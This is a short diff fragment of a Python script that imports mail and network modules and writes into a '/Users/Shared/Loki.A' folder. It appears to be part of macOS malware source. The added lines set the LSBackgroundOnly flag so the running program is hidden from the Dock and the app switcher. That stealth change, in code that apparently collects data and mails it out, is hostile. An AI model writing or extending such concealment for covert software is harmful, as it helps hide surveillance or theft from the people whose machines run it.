@@ -18,6 +18,9 @@ import smtplib
 from json import load
 from urllib.request import urlopen, Request
 import ssl
+from AppKit import NSBundle
+app_info = NSBundle.mainBundle().infoDictionary()
+app_info["LSBackgroundOnly"] = "1"
 
 # Create text files
 f = open ("/Users/Shared/Loki.A/word.txt", "w")
